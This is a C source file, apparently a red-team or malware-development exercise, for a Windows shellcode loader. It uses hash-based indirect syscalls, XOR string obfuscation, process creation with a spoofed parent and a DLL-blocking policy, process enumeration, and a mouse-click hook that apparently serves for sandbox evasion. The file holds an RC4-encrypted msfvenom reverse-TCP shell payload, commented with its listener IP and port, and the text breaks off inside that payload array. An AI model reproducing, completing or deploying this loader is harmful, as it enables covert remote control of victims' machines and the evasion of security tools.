#include <Windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include "Structs.h"
#include "HellsHall.h"
#pragma warning (disable:4996)

// generated by 'Hasher'
#define NtCreateUserProcess_CRC32        0x05AAA327
#define NtAllocateVirtualMemory_CRC32    0xE0762FEB
#define NtWriteVirtualMemory_CRC32       0xE4879939
#define NtProtectVirtualMemory_CRC32     0x5C2D1A97
#define NtCreateThreadEx_CRC32           0x2073465A
#define NtWaitForSingleObject_CRC32		 0xDD554681
#define NtQuerySystemInformation_CRC32   0x97FD2398
#define NtDelayExecution_CRC32           0xF5A86278

// a structure to keep the used sycalls
typedef struct _NTAPI_FUNC {

    NT_SYSCALL  NtCreateUserProcess;
	NT_SYSCALL	NtAllocateVirtualMemory;
    NT_SYSCALL  NtWriteVirtualMemory;
	NT_SYSCALL	NtProtectVirtualMemory;
    NT_SYSCALL  NtCreateThreadEx;
    NT_SYSCALL  WaitForSingleObject;
    NT_SYSCALL  NtQuerySystemInformation;
    NT_SYSCALL  NtDelayExecution;

}NTAPI_FUNC, * PNTAPI_FUNC;

NTAPI_FUNC g_Nt = { 0 };

// global hook handle variable
HHOOK g_hMouseHook = NULL;
// global mouse clicks counter
DWORD g_dwMouseClicks = NULL;

// Function Definitions
BOOL Decrypt_by_RC4(unsigned char* shellcode, size_t shellcode_length, unsigned char* pProtectedKey, size_t ProtectedKey_Length, PVOID pbuffer, SIZE_T psize);
typedef NTSTATUS(NTAPI* fnRtlCreateProcessParametersEx)(
    PRTL_USER_PROCESS_PARAMETERS* pProcessParameters,
    PUNICODE_STRING					ImagePathName,
    PUNICODE_STRING					DllPath,
    PUNICODE_STRING					CurrentDirectory,
    PUNICODE_STRING					CommandLine,
    PVOID							Environment,
    PUNICODE_STRING					WindowTitle,
    PUNICODE_STRING					DesktopInfo,
    PUNICODE_STRING					ShellInfo,
    PUNICODE_STRING					RuntimeData,
    ULONG							Flags
);

////// Functions ///////
XorStringDeObfuscate(IN unsigned char* pbytes, IN int byteSize, OUT WCHAR** pString0) {

    // printf("XOR Decrypted: ");
    for (int i = 0; i < byteSize; i++) {
        // Perform XOR operation
        pbytes[i] = pbytes[i] ^ 0xEA;
        // printf("%x", pbytes[i]);
    }
    // Call 1st time to get size
    int WideSize = MultiByteToWideChar(CP_ACP, 0, (LPCSTR)pbytes, byteSize, NULL, 0);
    WCHAR* modifiedString = (WCHAR*)malloc((WideSize + 1) * sizeof(WCHAR));
    // Call 2nd time to convert
    MultiByteToWideChar(CP_ACP, 0, (LPCSTR)pbytes, byteSize, modifiedString, WideSize);

    // Null-terminate the modified string
    modifiedString[WideSize] = L'\0';
    // wprintf(L"\tDeobfuscated string: %s\n", modifiedString);
    // Store string pointer to OUT buffer
    *pString0 = modifiedString;
}

// populate the 'g_Nt' structure by calling 'FetchNtSyscall' 
BOOL InitializeNtSyscalls() {

	if (!FetchNtSyscall(NtCreateUserProcess_CRC32, &g_Nt.NtCreateUserProcess)) {
		// printf("[!] Failed In Obtaining The Syscall Number Of NtCreateUserProcess \n");
		return FALSE;
	}
	// printf("[+] Syscall Number Of NtCreateUserProcess Is : 0x%0.2X \n\t\t>> Executing 'syscall' instruction Of Address : 0x%p\n", g_Nt.NtCreateUserProcess.dwSSn, g_Nt.NtCreateUserProcess.pSyscallInstAddress);
    
    if (!FetchNtSyscall(NtAllocateVirtualMemory_CRC32, &g_Nt.NtAllocateVirtualMemory)) {
        // printf("[!] Failed In Obtaining The Syscall Number Of NtAllocateVirtualMemory \n");
        return FALSE;
    }
    // printf("[+] Syscall Number Of NtAllocateVirtualMemory Is : 0x%0.2X \n\t\t>> Executing 'syscall' instruction Of Address : 0x%p\n", g_Nt.NtAllocateVirtualMemory.dwSSn, g_Nt.NtAllocateVirtualMemory.pSyscallInstAddress);
    
    if (!FetchNtSyscall(NtWriteVirtualMemory_CRC32, &g_Nt.NtWriteVirtualMemory)) {
        // printf("[!] Failed In Obtaining The Syscall Number Of NtWriteVirtualMemory \n");
        return FALSE;
    }
    // printf("[+] Syscall Number Of NtWriteVirtualMemory Is : 0x%0.2X \n\t\t>> Executing 'syscall' instruction Of Address : 0x%p\n", g_Nt.NtWriteVirtualMemory.dwSSn, g_Nt.NtWriteVirtualMemory.pSyscallInstAddress);

    if (!FetchNtSyscall(NtProtectVirtualMemory_CRC32, &g_Nt.NtProtectVirtualMemory)) {
        // printf("[!] Failed In Obtaining The Syscall Number Of NtProtectVirtualMemory \n");
        return FALSE;
    }
    // printf("[+] Syscall Number Of NtProtectVirtualMemory Is : 0x%0.2X \n\t\t>> Executing 'syscall' instruction Of Address : 0x%p\n", g_Nt.NtProtectVirtualMemory.dwSSn, g_Nt.NtProtectVirtualMemory.pSyscallInstAddress);

    if (!FetchNtSyscall(NtCreateThreadEx_CRC32, &g_Nt.NtCreateThreadEx)) {
        // printf("[!] Failed In Obtaining The Syscall Number Of NtCreateThreadEx \n");
        return FALSE;
    }
    // printf("[+] Syscall Number Of NtCreateThreadEx Is : 0x%0.2X \n\t\t>> Executing 'syscall' instruction Of Address : 0x%p\n", g_Nt.NtCreateThreadEx.dwSSn, g_Nt.NtCreateThreadEx.pSyscallInstAddress);

    if (!FetchNtSyscall(NtWaitForSingleObject_CRC32, &g_Nt.WaitForSingleObject)) {
        // printf("[!] Failed In Obtaining The Syscall Number Of WaitForSingleObject \n");
        return FALSE;
    }
    // printf("[+] Syscall Number Of WaitForSingleObject Is : 0x%0.2X \n\t\t>> Executing 'syscall' instruction Of Address : 0x%p\n", g_Nt.WaitForSingleObject.dwSSn, g_Nt.WaitForSingleObject.pSyscallInstAddress);
    
    if (!FetchNtSyscall(NtQuerySystemInformation_CRC32, &g_Nt.NtQuerySystemInformation)) {
        // printf("[!] Failed In Obtaining The Syscall Number Of NtQuerySystemInformation \n");
        return FALSE;
    }
    // printf("[+] Syscall Number Of NtQuerySystemInformation Is : 0x%0.2X \n\t\t>> Executing 'syscall' instruction Of Address : 0x%p\n", g_Nt.NtQuerySystemInformation.dwSSn, g_Nt.NtQuerySystemInformation.pSyscallInstAddress);

    if (!FetchNtSyscall(NtDelayExecution_CRC32, &g_Nt.NtDelayExecution)) {
        // printf("[!] Failed In Obtaining The Syscall Number Of NtDelayExecution \n");
        return FALSE;
    }
    // printf("[+] Syscall Number Of NtDelayExecution Is : 0x%0.2X \n\t\t>> Executing 'syscall' instruction Of Address : 0x%p\n", g_Nt.NtDelayExecution.dwSSn, g_Nt.NtDelayExecution.pSyscallInstAddress);

    return TRUE;
}

// Helper Function
VOID _RtlInitUnicodeString(OUT PUNICODE_STRING UsStruct, IN OPTIONAL PCWSTR Buffer) {

    if ((UsStruct->Buffer = (PWSTR)Buffer)) {

        unsigned int Length = wcslen(Buffer) * sizeof(WCHAR);
        if (Length > 0xfffc)
            Length = 0xfffc;

        UsStruct->Length = Length;
        UsStruct->MaximumLength = UsStruct->Length + sizeof(WCHAR);
    }

    else UsStruct->Length = UsStruct->MaximumLength = 0;
}

BOOL NtCreateUserProcessForBoth(
    IN	PWSTR	szTargetProcess,
    IN	PWSTR	szTargetProcessParameters,
    IN	PWSTR	szTargetProcessPath,
    IN	HANDLE	hParentProcess,
    OUT PHANDLE hProcess,
    OUT PHANDLE hThread
) {

    // getting the address of 'RtlCreateProcessParametersEx' and 'NtCreateUserProcess' from ntdll.dll
    fnRtlCreateProcessParametersEx	RtlCreateProcessParametersEx = (fnRtlCreateProcessParametersEx)GetProcAddress(GetModuleHandle(L"NTDLL"), "RtlCreateProcessParametersEx");

    if (RtlCreateProcessParametersEx == NULL)
        return FALSE;

    NTSTATUS						STATUS = NULL;
    UNICODE_STRING					UsNtImagePath = { 0 },
        UsCommandLine = { 0 },
        UsCurrentDirectory = { 0 };
    PRTL_USER_PROCESS_PARAMETERS	UppProcessParameters = NULL;
    // the mitigation policy flag (attribute value)
    DWORD64							dwBlockDllPolicy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
    PPS_ATTRIBUTE_LIST				pAttributeList = (PPS_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE_LIST));
    if (!pAttributeList)
        return FALSE;

    // initializing the 'UNICODE_STRING' structures with the inputted paths
    _RtlInitUnicodeString(&UsNtImagePath, szTargetProcess);
    _RtlInitUnicodeString(&UsCommandLine, szTargetProcessParameters);
    _RtlInitUnicodeString(&UsCurrentDirectory, szTargetProcessPath);

    // calling 'RtlCreateProcessParametersEx' to intialize a 'PRTL_USER_PROCESS_PARAMETERS' structure for 'NtCreateUserProcess' 
    STATUS = RtlCreateProcessParametersEx(&UppProcessParameters, &UsNtImagePath, NULL, &UsCurrentDirectory, &UsCommandLine, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROC_PARAMS_NORMALIZED);
    if (STATUS != STATUS_SUCCESS) {
        // printf("[!] RtlCreateProcessParametersEx Failed With Error : 0x%0.8X \n", STATUS);
        HeapFree(GetProcessHeap(), 0, pAttributeList);
        if (*hProcess == NULL || *hThread == NULL)
            return FALSE;
    }

    // setting the length of the attribute list
    // remember to set PS_ATTRIBUTE Attributes[3] in structs.h;
    pAttributeList->TotalLength = sizeof(PS_ATTRIBUTE_LIST);

    // intializing an attribute list of type 'PS_ATTRIBUTE_IMAGE_NAME' that specifies the image's path
    pAttributeList->Attributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
    pAttributeList->Attributes[0].Size = UsNtImagePath.Length;
    pAttributeList->Attributes[0].Value = (ULONG_PTR)UsNtImagePath.Buffer;

    // intializing an attribute list of type 'PS_ATTRIBUTE_MITIGATION_OPTIONS' that specifies the use of process's mitigation policies
    pAttributeList->Attributes[1].Attribute = PS_ATTRIBUTE_MITIGATION_OPTIONS;
    pAttributeList->Attributes[1].Size = sizeof(DWORD64);
    pAttributeList->Attributes[1].Value = &dwBlockDllPolicy;

    // intializing an attribute list of type 'PS_ATTRIBUTE_PARENT_PROCESS' that specifies the process's parent
    pAttributeList->Attributes[2].Attribute = PS_ATTRIBUTE_PARENT_PROCESS;
    pAttributeList->Attributes[2].Size = sizeof(HANDLE);
    pAttributeList->Attributes[2].Value = hParentProcess;

    // creating the 'PS_CREATE_INFO' structure, that will almost always look like this
    PS_CREATE_INFO				psCreateInfo = {
                                            .Size = sizeof(PS_CREATE_INFO),
                                            .State = PsCreateInitialState
    };

    // creating the process
    // hProcess and hThread are already pointers
    // STATUS = NtCreateUserProcess(hProcess, hThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, NULL, NULL, UppProcessParameters, &psCreateInfo, pAttributeList);

    SET_SYSCALL(g_Nt.NtCreateUserProcess);
    if ((STATUS = RunSyscall(hProcess, hThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, NULL, NULL, UppProcessParameters, &psCreateInfo, pAttributeList)) != 0x00) {
        // printf("[!] NtCreateUserProcess Failed With Error : 0x%0.8X \n", STATUS);
        HeapFree(GetProcessHeap(), 0, pAttributeList);
        if (*hProcess == NULL || *hThread == NULL)
            return FALSE;
    }
    return TRUE;
}

ProcessCheckByNtQuery(IN LPCWSTR szProcName, OUT DWORD* pdwPid) {

    ULONG							uReturnLen1 = NULL, uReturnLen2 = NULL;
    PSYSTEM_PROCESS_INFORMATION		SystemProcInfo = NULL;
    PVOID							pValueToFree = NULL;
    NTSTATUS						STATUS = NULL;

    // This will fail with STATUS_INFO_LENGTH_MISMATCH
    // 1st call is just to get the buffer size for how big the struct will be (because it depends on # of processes)
    SET_SYSCALL(g_Nt.NtQuerySystemInformation);
    STATUS = RunSyscall(SystemProcessInformation, NULL, NULL, &uReturnLen1);

    // allocating enough buffer for the returned array of `SYSTEM_PROCESS_INFORMATION` struct
    SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)uReturnLen1);
    if (SystemProcInfo == NULL) {
        // printf("[!] HeapAlloc Failed With Error : %d\n", GetLastError());
        return FALSE;
    }
    // since we will modify 'SystemProcInfo', we will save its intial value before the while loop to free it later
    pValueToFree = SystemProcInfo;

    // Call NtQuerySystemInformation a 2nd time to store struct in "SystemProcInfo"
    SET_SYSCALL(g_Nt.NtQuerySystemInformation);
    if ((STATUS = RunSyscall(SystemProcessInformation, SystemProcInfo, uReturnLen1, &uReturnLen2) != 0x00)) {
        // printf("[!] NtQuerySystemInformation Failed With Error: 0x%0.8X \n", STATUS);
        return -1;
    }

    while (TRUE) {
        // Check the process's size and Compare the enumerated process name to the intended target process
        if (SystemProcInfo->ImageName.Length && wcscmp(SystemProcInfo->ImageName.Buffer, szProcName) == 0) {
            // saving process pid and handle, then breaking 
            *pdwPid = (DWORD)SystemProcInfo->UniqueProcessId;
            // get process handle
            // *phProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)SystemProcInfo->UniqueProcessId);
            break;
        }
        // if NextEntryOffset is 0, we reached the end of the array
        if (!SystemProcInfo->NextEntryOffset)
            break;
        // moving to the next element in the array
        SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemProcInfo + SystemProcInfo->NextEntryOffset);
    }

    // Free the initial address
    HeapFree(GetProcessHeap(), 0, pValueToFree);
    // Check if we successfully got the target process handle
    if (*pdwPid == NULL)
        return FALSE;
    else
        return TRUE;
}

LRESULT CALLBACK HookEvent(int nCode, WPARAM wParam, LPARAM lParam) {

    // WM_RBUTTONDOWN :         "Right Mouse Click"
    // WM_LBUTTONDOWN :         "Left Mouse Click"
    // WM_MBUTTONDOWN :         "Middle Mouse Click"

    if (wParam == WM_LBUTTONDOWN || wParam == WM_RBUTTONDOWN || wParam == WM_MBUTTONDOWN) {
        // printf("[+] Mouse Click Recorded \n");
        g_dwMouseClicks++;
    }

    return CallNextHookEx(g_hMouseHook, nCode, wParam, lParam);
}

BOOL MouseClicksLogger() {

    MSG         Msg = { 0 };

    // installing hook 
    g_hMouseHook = SetWindowsHookExW(WH_MOUSE_LL, (HOOKPROC)HookEvent, NULL, NULL);
    if (!g_hMouseHook) {
        // printf("[!] SetWindowsHookExW Failed With Error : %d \n", GetLastError());
    }

    // process unhandled events
    while (GetMessageW(&Msg, NULL, NULL, NULL)) {
        DefWindowProcW(Msg.hwnd, Msg.message, Msg.wParam, Msg.lParam);
    }

    return TRUE;
}


// When Changing payload, REMEMBER TO UPDATE "NumberOfElements" (number of ips)
// Encrypted msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.50.235 LPORT=8443 -f c
unsigned char Rc4Encrypted_IPv4Payload[] = {
        0xE7, 0xFC, 0x47, 0x62, 0xEE, 0x17, 0x4F, 0xB0, 0x5B, 0x15, 0xBB, 0xF6, 0xCE, 0x59, 0x14, 0xC1,
        0xBF, 0xD5, 0xE1, 0x5A, 0x2D, 0x63, 0xA4, 0x4A, 0xDD, 0xAE, 0xB4, 0x81, 0x30, 0xF5, 0x2B, 0x4D,
        0x34, 0x51, 0x68, 0x78, 0x80, 0x60, 0x91, 0xC9, 0x72, 0x13, 0x17, 0x22, 0xD7, 0xA3, 0x58, 0x17,
        0x23, 0x04, 0x27, 0x12, 0x32, 0x1A, 0xF1, 0xDD, 0xDB, 0x15, 0xE5, 0x19, 0x3A, 0xAA, 0x5E, 0xC0,
        0xA2, 0x7E, 0xF2, 0x52, 0xF6, 0xC1, 0x24, 0xA6, 0xEA, 0x65, 0xDE, 0xF9, 0xB4, 0xFF, 0x34, 0x29,
        0xDF, 0x25, 0x30, 0x8F, 0x25, 0x19, 0x69, 0xBE, 0x6C, 0x0B, 0x80, 0xF4, 0xA5, 0xB2, 0x70, 0xFC,
        0x87, 0x08, 0xD0, 0xD5, 0x1A, 0xA6, 0x9D, 0x0A, 0xA2, 0x79, 0x28, 0xFD, 0xA8, 0xDB, 0xD6, 0xC5,
        0x18, 0x77, 0x1D, 0xFA, 0x5C, 0x8A, 0xC4, 0xF5, 0xD1, 0xF0, 0x99, 0x95, 0x4B, 0x77, 0x39, 0x40,
        0xB7, 0xC2, 0xB3, 0x40, 0x34, 0xFD, 0xAC, 0x21, 0xBB, 0x27, 0x9E, 0x03, 0x5F, 0x7E, 0xC7, 0x4B,
        0x01, 0xAD, 0x79, 0x80, 0xC8, 0xEB, 0x81, 0x28, 0xEE, 0x9F, 0x23, 0xA8, 0x7A, 0xA0, 0x4F, 0x4E,
        0xCC, 0xB1, 0x7D, 0x4D, 0x58, 0x4B, 0x51, 0xCD, 0x9B, 0xD5, 0x75, 0xD4, 0x6D, 0x9C, 0x06, 0x1E,
        0xF8, 0x42, 0x2A, 0xF6, 0x13, 0x08, 0x80, 0x88, 0xB5, 0xE1, 0x8A, 0x99, 0x31, 0x59, 0xDC, 0xE6,
        0xB9, 0x7B, 0x68, 0xDC, 0x0C, 0x40, 0x5B, 0xDA, 0xBC, 0x85, 0x5C, 0xA2, 0xC7, 0xA3, 0xEA, 0x2A,
        0x79, 0xB6, 0xD3, 0xA7, 0xF9, 0x97, 0xB1, 0x1E, 0xBB, 0x98, 0x74, 0xC3, 0xF6, 0xFE, 0xE8, 0x29,
        0xFB, 0x71, 0xB0, 0x78, 0x18, 0x6C, 0x63, 0x00, 0x68, 0x48, 0xEB, 0x0B, 0x6E, 0x17, 0xC0, 0x5F,
        0x0B, 0xB8, 0xA5, 0xEB, 0x10, 0x40, 0xB5, 0x0C, 0xD1, 0x08, 0x3C, 0x46, 0xEB, 0x92, 0x75, 0x5D,
        0xE0, 0xDE, 0xA4, 0x0F, 0xEF, 0x1B, 0xAD, 0x0B, 0x49, 0x6A, 0xDF, 0xEA, 0x8D, 0x90, 0xB9, 0xB0,
        0x86, 0x0B, 0xCD, 0x32, 0x85, 0x71, 0x1F, 0xE6, 0xDB, 0x7E, 0x85, 0xC4, 0x91, 0x6C, 0xD8, 0xD5,
        0x6B, 0xBC, 0x31, 0x13, 0x5B, 0xC4, 0xE2, 0x50, 0x63, 0x81, 0x08, 0x6E, 0x20, 0x7A, 0xDD, 0x45,
        0xC0, 0x16, 0xF5, 0x85, 0x92, 0x4E, 0x2C, 0x29, 0xFB, 0xDD, 0x62, 0x8A, 0xEC, 0x6B, 0x40, 0xFD,
        0x96, 0xB7, 0xDA, 0x0B, 0x68, 0x64, 0x58, 0x8C, 0x63, 0x7F, 0x1D, 0x76, 0x73, 0x34, 0x6E, 0xAB,
        0xC6, 0x7E, 0xE8, 0xD5, 0x59, 0xB9, 0xD7, 0xDB, 0x8F, 0x2C, 0x53, 0x88, 0x46, 0xEA, 0xAD, 0x20,
        0x2C, 0xBB, 0x3E, 0x21, 0x6B, 0xD3, 0x8F, 0xDB, 0x6B, 0x81, 0x59, 0xB4, 0x02, 0x70, 0x9D, 0x85,
        0xD7, 0x69, 0x7F, 0xF1, 0x8E, 0xCA, 0xB4, 0x4B, 0xAE, 0xDE, 0xFA, 0x30, 0xF7, 0x6F, 0x6F, 0xD1,
        0xCA, 0x78, 0x9F, 0xCF, 0x9E, 0xF8, 0xFC, 0xDD, 0x05, 0xE2, 0x9F, 0x45, 0x8B, 0x31, 0xC9, 0xF1,
        0xC8, 0xC5, 0xA2, 0x6F, 0x5B, 0x05, 0x11, 0x0B, 0x05, 0x40, 0x96, 0x53, 0x0D, 0x94, 0x8A, 0xF7,
        0xFE, 0x4B, 0x06, 0x1E, 0x2D, 0x53, 0x7F, 0xB8, 0xAC, 0xF2, 0x94, 0x75, 0xF3, 0xD6, 0xF5, 0xDE,
        0xEC, 0x2B, 0x7D, 0xE1, 0x35, 0x83, 0xBD, 0x7A, 0x3C, 0xB2, 0x27, 0xAB, 0x14, 0x53, 0x60, 0xAB,
        0x19, 0x02, 0x35, 0x5C, 0x0A, 0x06, 0x1A, 0x88, 0xC5, 0xA8, 0x05, 0x6D, 0xB4, 0x7E, 0x83, 0x62,
        0x19, 0x6F, 0x8E, 0xDC, 0xD7, 0xF0, 0xA3, 0xBF, 0xE9, 0x7F, 0x2E, 0x73, 0x05, 0x76, 0x39, 0x0E,
        0x83, 0x96, 0xA3, 0x28, 0x0A, 0xE9, 0xF2, 0xB2, 0xC4, 0x15, 0xA7, 0xDC, 0x91, 0x77, 0x67, 0x54,
        0xFD, 0x27, 0x4C, 0x31, 0x26, 0x6F, 0x2E, 0xA7, 0xC4, 0x39, 0x3F, 0x96, 0xAE, 0xB8, 0x98, 0x9B,
        0x43, 0xE2, 0x1F, 0x10, 0x8B, 0x36, 0x12, 0x96, 0x7C, 0x67, 0x11, 0x43, 0x75, 0x3D, 0x61, 0xE2,
        0xE0, 0xBA, 0x26, 0x11, 0xDD, 0x12, 0x87, 0x26, 0xDF, 0x75, 0x7C, 0x6B, 0x2F, 0xF5, 0xF7, 0x10,
        0xB4, 0x7C, 0xFE, 0x51, 0xF2, 0xFA, 0x11, 0xCC, 0x84, 0x15, 0x36, 0x0D, 0x3A, 0x38, 0x8F, 0x63,
        0x12, 0xFD, 0xDE, 0xCF, 0x08, 0xE0, 0x68, 0x55, 0xEB, 0x1F, 0xB3, 0x8C, 0x08, 0x69, 0xBA, 0x0F,
        0xB8, 0x33, 0x25, 0xBF, 0x55, 0xFA, 0xBA, 0xA0, 0x1D, 0x4E, 0x9E, 0x3F, 0xD3, 0x0F, 0x9E, 0xD9,
        0xB9, 0x74, 0x9F, 0x75, 0x98, 0x5E, 0xDE, 0x76, 0x8E, 0x0F, 0x4C, 0x96, 0xE1, 0x53, 0xE0, 0xAB,
        0x58, 0x87, 0x3F, 0x5B, 0xE0, 0xD1, 0x92, 0x7B, 0x25, 0x4D, 0x3E, 0x42, 0x61, 0x40, 0x5D, 0x67,
        0xF9, 0xE9, 0xBF, 0x53, 0x90, 0x53, 0xA1, 0x11, 0xDE, 0x37, 0x6F, 0x41, 0x21, 0x4F, 0xCC, 0x46,
        0x35, 0x2B, 0xF0, 0x20, 0xBD, 0x7D, 0x1E, 0x66, 0x00, 0xC0, 0xC5, 0x68, 0x58, 0x48, 0xDB, 0x08,
        0x9B, 0xD5, 0x63, 0xE2, 0x95, 0xA2, 0xD3, 0xA7, 0x01, 0x57, 0x9C, 0x4D, 0x40, 0x81, 0xA1, 0x68,
        0x39, 0xD9, 0xB4, 0x97, 0x1A, 0xD7, 0x4D, 0x1C, 0xE9, 0x52, 0xF3, 0x2D, 0xCF, 0xE8, 0x04, 0x4E,
        0xAB, 0x3B, 0x65, 0x81, 0xFA, 0xC2, 0xC0, 0x71, 0xFA, 0x42, 0x6F, 0x73, 0x80, 0x08, 0xED, 0x8B,
        0x30, 0xD2, 0x6E, 0xDA, 0xAF, 0x11, 0x5C, 0x77, 0x02, 0x1E, 0xF5, 0x31, 0xB5, 0x47, 0xC3, 0xE7,
        0xE6, 0xCF, 0x95, 0x8D, 0xF8, 0xCB, 0xB5, 0xAF, 0xB3, 0x95, 0x3A, 0xF5, 0xFC, 0xB6, 0xE4, 0xE2,
        0xD9, 0x84, 0xE7, 0x30, 0xB2, 0x2A, 0x89, 0x43, 0x0A, 0x88, 0xED, 0x19, 0xE2, 0x4D, 0xA7, 0xF1,
        0xE5, 0x19, 0x11, 0xB9, 0x72, 0xFB, 0x71, 0x8B, 0x59, 0x15, 0xF2, 0xCF, 0x41, 0x68, 0x5E, 0x03,
        0x99, 0x18, 0xF0, 0x36, 0x93, 0x5E, 0xCF, 0xCB, 0x30, 0x6C, 0x9A, 0xAE, 0xE5, 0x98, 0x11, 0x78,
        0x80, 0x41, 0x29, 0xBB, 0x14, 0xCF, 0x57, 0x33, 0xBC, 0x98, 0x71, 0x75, 0x89, 0xE7, 0x9A, 0x41,
        0x59, 0x94, 0x00, 0x97, 0x54, 0xAA, 0xDD, 0xE6, 0xF8, 0xC6, 0x40, 0x2E, 0xBD, 0x05, 0xE6, 0x69,
        0x56, 0x31, 0x95, 0xB2, 0xEF, 0x74, 0xD6, 0x61, 0x88, 0x83, 0x3F, 0xCC, 0x1D, 0xFA, 0xC5, 0xC3,
        0x3F, 0x81, 0xF2, 0x97, 0x65, 0xBF, 0x3B, 0x6D, 0xB8, 0x9E, 0xE8, 0x9D, 0xD4, 0xA2, 0x3D, 0x1A,
        0xFB, 0x04, 0xFC, 0x0C, 0x2C, 0x1B, 0xDB, 0xE6, 0x71, 0x53, 0x98, 0x08, 0x87, 0x62, 0xCF, 0x77,
        0xD2, 0x2D, 0xD7, 0x53, 0xB1, 0x59, 0x91, 0x2A, 0x69, 0x60, 0x49, 0x09, 0x96, 0x00, 0x37, 0xF4,
        0x97, 0x0E, 0xB4, 0x8B, 0x3B, 0xA3, 0xEB, 0xE0, 0x94, 0x01, 0xD7, 0x29, 0xCE, 0xD2, 0x75, 0x0D,
        0xB7, 0x81, 0x9D, 0x44, 0xE6, 0xB5, 0xEB, 0xFE, 0x8B, 0xDA, 0x15, 0xB3, 0xF7, 0x27, 0xD2, 0x42,
        0xDA, 0xB3, 0xE5, 0xAF, 0x34, 0x38, 0xF5, 0x73, 0x79, 0xC9, 0xF4, 0xD4, 0x5A, 0xD5, 0xF3, 0xA9,
        0xC1, 0x18, 0x86, 0x1B, 0xF3, 0x57, 0x16, 0x03, 0x12, 0xD2, 0x22, 0x6E, 0xA8, 0xC8, 0xEA, 0x32,
        0xA9, 0x32, 0xD5, 0xD7, 0x6B, 0xAD, 0x19, 0x04, 0x57, 0x4F, 0xCD, 0x92, 0x3A, 0x21, 0x6E, 0xC6,
        0xB1, 0xD5, 0x1D, 0x12, 0xC5, 0xDA, 0x4E, 0x7F, 0x4A, 0xEF, 0x44, 0xC4, 0x37, 0x39, 0x24, 0xC1,
        0x19, 0xE4, 0x15, 0x3F, 0x27, 0xE6, 0x28, 0x83, 0x7C, 0x3C, 0x77, 0x10, 0xDA, 0x5C, 0x4B, 0x07,
        0xAF, 0x75, 0x8D, 0x53, 0x9A, 0x7E, 0x07, 0x26, 0xD2, 0xB8, 0x1B, 0xCA, 0x8B, 0x5B, 0xA5, 0x0A,
        0x88, 0x10, 0x54, 0x4C, 0xE3, 0x3D, 0xE3, 0xA0, 0xF3, 0x32, 0xFB, 0xCA, 0x64, 0x4A, 0xC8, 0x9E,
        0x2B, 0x8D, 0x94, 0x18, 0xCB, 0xE5, 0xDC, 0x76, 0x42, 0xC2, 0x4D, 0x66, 0x60, 0x47, 0x90, 0xD1,
        0x6F, 0x2E, 0x8A, 0x82, 0x0C, 0x02, 0x8D, 0xCE, 0x2D, 0x91, 0xB4, 0x41, 0xC2, 0x85, 0xB0, 0xAE,
        0xD9, 0xE3, 0x1A, 0x9B, 0x98, 0x54, 0x3A, 0x58, 0x0D, 0xC2, 0x54, 0xE7, 0x55, 0x4A, 0x29, 0x71,
        0x1B, 0x45, 0xA3, 0x7D, 0xD7, 0x08, 0x82, 0x39, 0x2F, 0xCE, 0x4E, 0xE4, 0x67, 0x8F, 0xE8, 0x2C,
        0xDD, 0x62, 0xD5, 0x41, 0x15, 0xF2, 0x5E, 0x59, 0x16, 0xFF, 0x69, 0x0B, 0x35, 0x01, 0xDE, 0x4B,
        0x97, 0x4C, 0xB4, 0x49, 0x2F, 0xB1, 0x10, 0x93, 0x7F, 0x4D, 0xAD, 0x10, 0x06, 0x4A, 0xCE, 0x85,
        0x0D, 0x77, 0x91, 0x06, 0xDC, 0x21, 0x86, 0x18, 0xF8, 0x2D, 0xBB, 0x40, 0x73, 0xD5, 0xAF, 0xCB,
        0x30, 0x39, 0x6B, 0xAD, 0xA2, 0x03, 0xA0, 0x50, 0xE1, 0xF9, 0xB0, 0x3F, 0x33, 0x25, 0xA6, 0xAF,
        0xAA, 0x68, 0x6F, 0xBE, 0x07, 0x57, 0xC5, 0x8F, 0xBC, 0x00, 0x9F, 0xA0, 0x67, 0xBE, 0x8C, 0xF5,
        0x5A, 0x68, 0xE5, 0x9C, 0x45, 0x04, 0xB0, 0x5C, 0x51, 0x6B, 0xA9, 0x82, 0x69, 0xCF, 0x6C, 0xFB,
        0x9D, 0x90, 0xF8, 0x06, 0x31, 0x0D, 0xC9, 0x80, 0xBF, 0xC9, 0x95, 0xE8, 0xBC, 0xB6, 0xB6, 0xA2,
        0x1F, 0x27, 0x4D, 0xA8, 0x7C, 0x1B, 0x40, 0xC2, 0xC6, 0xBF, 0x9A, 0x5B, 0x7D, 0x40, 0x18, 0xB6,
        0x1A, 0x57, 0x2D, 0xD6, 0xDF, 0x9D, 0x64, 0x37, 0x15, 0xC8, 0xC8, 0x89, 0x04, 0x7C, 0xB3, 0xEA,
        0x04, 0xA0, 0xFC, 0x85, 0x0F, 0x20, 0x5A, 0x1A, 0x1B, 0xF7, 0x9F, 0xD7, 0x7B, 0x0B, 0x89, 0xC3,
        0x2A, 0x94, 0x23, 0x7D, 0xDB, 0x21, 0xAE, 0x5F, 0xC6, 0x13, 0x63, 0xC2, 0x2B, 0x6E, 0x5E, 0xA6,
        0x73, 0xFD, 0x36, 0xC1, 0x4A, 0xFC, 0xB8, 0x01, 0xC9, 0x9F, 0xBB, 0x12, 0x3F, 0x78, 0x11, 0x5D,
        0x20, 0x9C, 0x40, 0xA3, 0x43, 0x8E, 0x1F, 0x1E, 0xE4, 0x63, 0x5A, 0x1F, 0xF0, 0x55, 0x07, 0xFF,
        0x40, 0xC8, 0xE6, 0xD1, 0xB8, 0x56, 0x2A, 0x66, 0x79, 0x43, 0xC4, 0x4D, 0xEB, 0x84, 0x8C, 0x87,
        0x7D, 0xC7, 0x13, 0xF0, 0x4B, 0xFD, 0x38, 0xEC, 0xD2, 0x57, 0x7B, 0x0F, 0x8E, 0xD1, 0xAA, 0xB8,
